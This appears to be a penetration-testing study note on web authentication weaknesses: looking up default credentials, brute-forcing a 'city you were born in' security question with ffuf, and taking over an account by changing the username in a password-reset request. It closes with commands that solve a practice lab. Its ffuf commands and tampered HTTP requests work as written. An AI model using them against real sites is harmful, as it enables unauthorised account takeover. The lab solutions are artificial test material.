# Default Credentials

### Testing Default Credentials

Many platforms provide lists of default credentials for a wide variety of web applications. Such an example is the web database maintained by [CIRT.net](https://www.cirt.net/passwords). For instance, if we identified a Cisco device during a penetration test, we can search the database for default credentials for Cisco devices:

<figure><img src="../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

Further resources include [SecLists Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials) as well as the [SCADA](https://github.com/scadastrangelove/SCADAPASS/tree/master) GitHub repository which contains a list of default passwords for a variety of different vendors.

A targeted internet search is a different way of obtaining default credentials for a web application. Let us assume we stumble across a [BookStack](https://github.com/BookStackApp/BookStack) web application during an engagement:

<figure><img src="../../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

We can try to search for default credentials by searching something like `bookstack default credentials`:

<figure><img src="../../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>

As we can see, the results contain the installation instructions for BookStack, which state that the default admin credentials are `admin@admin.com:password`.

## Vulnerable Password Reset

We have already discussed how to brute-force password reset tokens to take over a victim's account. However, even if a web application utilizes rate limiting and CAPTCHAs, business logic bugs within the password reset functionality can allow taking over other users' accounts.

***

### Guessable Password Reset Questions

Often, web applications authenticate users who have lost their passwords by requesting that they answer one or multiple security questions. During registration, users provide answers to predefined and generic security questions, disallowing users from entering custom ones. Therefore, within the same web application, the security questions of all users will be the same, allowing attackers to abuse them.

Assuming we had found such functionality on a target website, we should try abusing it to bypass authentication. Often, the weak link in a question-based password reset functionality is the predictability of the answers. It is common to find questions like the following:

* "`What is your mother's maiden name?`"
* "`What city were you born in?`"

While these questions seem tied to the individual user, they can often be obtained through `OSINT` or guessed, given a sufficient number of attempts, i.e., a lack of brute-force protection.

For instance, assuming a web application uses a security question like `What city were you born in?`:

<figure><img src="../../.gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>

We can attempt to brute-force the answer to this question by using a proper wordlist. There are multiple lists containing large cities in the world. For instance, [this](https://github.com/datasets/world-cities/blob/master/data/world-cities.csv) CSV file contains a list of more than 25,000 cities with more than 15,000 inhabitants from all over the world. This is a great starting point for brute-forcing the city a user was born in.

Since the CSV file contains the city name in the first field, we can create our wordlist containing only the city name on each line using the following command:

```shell-session
eldeim@htb[/htb]$ cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt

eldeim@htb[/htb]$ wc -l city_wordlist.txt 

26468 city_wordlist.txt
```

As we can see, this results in a total of 26,468 cities.

To set up our brute-force attack, we first need to specify the user we want to target:

<figure><img src="../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

As an example, we will target the user `admin`. After specifying the username, we must answer the user's security question. The corresponding request looks like this:

<figure><img src="../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

We can set up the corresponding `ffuf` command from this request to brute-force the answer. Keep in mind that we need to specify our session cookie to associate our request with the username `admin` we specified in the previous step:

```shell-session
eldeim@htb[/htb]$ ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."

<SNIP>

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
    * FUZZ: Houston
```

After obtaining the security response, we can reset the admin user's password and entirely take over the account:

<figure><img src="../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

For instance, if we knew that our target user was from Germany, we could create a wordlist containing only German cities, reducing the number to about a thousand cities:

```shell-session
eldeim@htb[/htb]$ cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt

eldeim@htb[/htb]$ wc -l german_cities.txt 

1117 german_cities.txt
```

### Manipulating the Reset Request

For instance, consider the following password reset flow, which is similar to the one discussed above. First, we specify the username:

<figure><img src="../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

We will use our demo account `htb-stdnt`, which results in the following request:



```http
POST /reset.php HTTP/1.1
Host: pwreset.htb
Content-Length: 18
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

username=htb-stdnt
```

Afterward, we need to supply the response to the security question:

<figure><img src="../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

Supplying the security response `London` results in the following request:

```http
POST /security_question.php HTTP/1.1
Host: pwreset.htb
Content-Length: 43
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

security_response=London&username=htb-stdnt
```

As we can see, the username is contained in the form as a hidden parameter and sent along with the security response. Finally, we can reset the user's password:

<figure><img src="../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

The final request looks like this:

```http
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

password=P@$$w0rd&username=htb-stdnt
```

Like the previous request, the request contains the username in a separate POST parameter. Suppose the web application does properly verify that the usernames in both requests match. In that case, we can skip the security question or supply the answer to our security question and then set the password of an entirely different account. For instance, we can change the admin user's password by manipulating the `username` parameter of the password reset request:

```http
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Length: 32
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

password=P@$$w0rd&username=admin
```

### PoCs - Questions

* Which city is the admin user from?

First get the cities diccitionay, then do ffuf in this camp -->

```
wget https://github.com/datasets/world-cities/blob/main/data/world-cities.csv
##
grep "United Kingdom" world-cities.csv | cut -d ',' -f1 > uk_cities.txt
##
ffuf -w ./uk_cities.txt -u http://83.136.253.201:40536/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=ncuk1domk1ef4b91ppkv1ahl0f" -d "security_response=FUZZ" -fr "Incorrect response."
```

* Reset the admin user's password on the target system to obtain the flag.

LogIn with the credentials change ...
